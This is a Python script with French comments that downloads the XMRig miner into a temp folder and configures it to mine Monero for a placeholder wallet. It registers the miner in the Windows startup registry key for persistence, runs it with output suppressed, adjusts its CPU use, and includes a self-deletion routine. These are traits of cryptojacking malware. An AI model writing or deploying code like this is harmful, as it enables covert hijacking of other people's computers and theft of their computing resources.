import os
import subprocess
import sys
import shutil
import winreg
import requests
import ctypes
import time
import psutil  # Pour surveiller l'utilisation du CPU

# Paramètres de configuration
WALLET_ADDRESS = "VOTRE_ADRESSE_MONERO"
POOL_ADDRESS = "stratum+tcp://pool.monero.hashvault.pro:5555"
DONATE_LEVEL = 1  # Niveau de donation à XMRig
MAX_CPU_USAGE = 80  # Limite maximale d'utilisation du CPU
MINER_URL = "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-msvc-win64.zip"
MINER_DIR = os.path.join(os.getenv("TEMP"), "xmrig")

def is_admin():
    """Vérifie si le programme est exécuté en tant qu'administrateur."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def download_miner():
    """Télécharge le mineur XMRig depuis GitHub."""
    if not os.path.exists(MINER_DIR):
        os.makedirs(MINER_DIR)
    miner_zip = os.path.join(MINER_DIR, "xmrig.zip")
    print("Téléchargement du mineur...")
    response = requests.get(MINER_URL, stream=True)
    with open(miner_zip, "wb") as f:
        for chunk in response.iter_content(chunk_size=8192):
            f.write(chunk)
    print("Téléchargement terminé.")
    shutil.unpack_archive(miner_zip, MINER_DIR)
    os.remove(miner_zip)

def configure_miner(cpu_usage):
    """Configure le mineur avec les paramètres fournis."""
    config_path = os.path.join(MINER_DIR, "config.json")
    config = {
        "autosave": True,
        "cpu": {
            "enabled": True,
            "max-threads-hint": cpu_usage,  # Ajuste l'intensité du minage
        },
        "donate-level": DONATE_LEVEL,
        "pools": [
            {
                "url": POOL_ADDRESS,
                "user": WALLET_ADDRESS,
            }
        ],
    }
    import json
    with open(config_path, "w") as f:
        json.dump(config, f, indent=4)

def add_to_startup():
    """Ajoute le mineur au démarrage de Windows."""
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        registry_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, "MoneroMiner", 0, winreg.REG_SZ, os.path.join(MINER_DIR, "xmrig.exe"))
        winreg.CloseKey(registry_key)
    except Exception as e:
        print(f"Erreur lors de l'ajout au démarrage: {e}")

def start_mining():
    """Démarre le minage en arrière-plan avec une gestion dynamique du CPU."""
    miner_exe = os.path.join(MINER_DIR, "xmrig.exe")
    try:
        process = subprocess.Popen([miner_exe], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
        print("Minage démarré.")

        while True:
            # Surveille l'utilisation du CPU
            cpu_usage = psutil.cpu_percent(interval=1)
            print(f"Utilisation actuelle du CPU: {cpu_usage}%")

            # Ajuste l'intensité du minage en fonction de l'utilisation du CPU
            if cpu_usage > MAX_CPU_USAGE:
                new_cpu_usage = max(10, MAX_CPU_USAGE - (cpu_usage - MAX_CPU_USAGE))  # Réduit l'intensité
                configure_miner(new_cpu_usage)
                print(f"Réduction de l'intensité du minage à {new_cpu_usage}%.")
            else:
                configure_miner(MAX_CPU_USAGE)  # Utilise l'intensité maximale
                print(f"Intensité du minage maximale à {MAX_CPU_USAGE}%.")

            time.sleep(10)  # Vérifie toutes les 10 secondes

    except Exception as e:
        print(f"Erreur lors du démarrage du minage: {e}")

def self_destruct():
    """Supprime le programme et les fichiers temporaires."""
    print("Auto-destruction en cours...")
    time.sleep(5)  # Attendre quelques secondes avant de se supprimer
    try:
        os.remove(sys.argv[0])  # Supprime le script actuel
        shutil.rmtree(MINER_DIR)  # Supprime le dossier du mineur
        print("Auto-destruction terminée.")
    except Exception as e:
        print(f"Erreur lors de l'auto-destruction: {e}")

if __name__ == "__main__":
    if not is_admin():
        print("Le programme doit être exécuté en tant qu'administrateur.")
        sys.exit(1)
    
    # Télécharger et configurer le mineur
    download_miner()
    configure_miner(MAX_CPU_USAGE)
    
    # Ajouter au démarrage et démarrer le minage
    add_to_startup()
    start_mining()
    
    # Auto-destruction
    self_destruct()